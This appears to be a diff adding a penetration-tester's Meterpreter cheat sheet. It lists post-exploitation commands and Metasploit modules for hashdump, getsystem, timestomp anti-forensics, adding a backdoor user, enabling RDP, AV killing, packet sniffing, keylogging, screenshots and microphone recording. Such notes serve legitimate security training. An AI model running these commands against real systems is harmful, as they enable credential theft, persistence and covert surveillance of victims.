@@ -1,0 +1,88 @@
+
+# Meterpreter
+
+# Commands
+
+help
+cd or lcd
+pwd lpwd
+ls
+mkdir oe rmdir
+cat or edit
+
+sysinfo
+reg <command> <options> 
+getpid getuid
+execute -f <command.exe>
+ps or kill <PID>
+reboot or shutdown
+
+load <extention>
+help <extension>
+
+run post/platform/function/name
+use loacl_exploit
+set SESSION <session_id>
+exploit
+
+# Post exploitation
+
+Meterpreter extensions
+- extapi		; provides functionality to manage services, the user's clipboard, Active Directory services interfaces and WMI queries. 
+- sniffer		; provieds packet capture capabilities
+- espia			; provieds access to the webcam and microphone
+- mimikatz		; grabs credentials from memory
+- lanattacks	; allows you to start rogue DHCP and TFTP servers for attacking other systems
+- incognito		; dump password hashes and conduct token impersonation attacks
+- networkpug	; craft network packets to send on the target network using the target system
+
+Local Exploits and Post Modules
+- exploit/windows/local/ask		; abuses UAC to aquire elevated provileges
+- exploit/windows/loacl/wmi		; uses WMI for remote command execution
+- exploit/linus/local/pkexec	; use for systems with a poolicy kit bug
+- exploit/osx/loacl/rootpipe	; uses a backdoor API in the admin framework
+- post/windows/gather/enum_ie	; copies sensitive information out of IE for each user on the system
+- post/windows/manage/killav	; looks for Windows-specific anti-malware or AV software and terminate those processes	
+- post/multi/gather/env			; gathers environment variables on the target system
+
+help stdapi
+getuid
+sysinfo
+cd /
+pwd
+ls
+search -f *.doc
+ps
+help priv
+timestomp -h
+ls /boot.ini
+timestomp -m "01/01/1970 00:00:00" /boot.ini
+hashdump
+getsystem
+getuid
+load incognito
+add_user Iamhere Success!2
+run post/windows/manage/enable_rdp
+run post/windows/gather/enum_shares
+run post/windows/gather/enum_ie
+load sniffer
+help sniffer
+sniffer_interfaces
+sniffer_start 1
+sniffer_stats 1
+sniffer_stop 1
+sniffer_dump 1 target.pcap
+
+background
+
+idletime
+ps 
+migrate<PID>
+keyscan_start
+keyscan_dump
+screenshot
+record_mic -h
+uictl -h
+
+
+
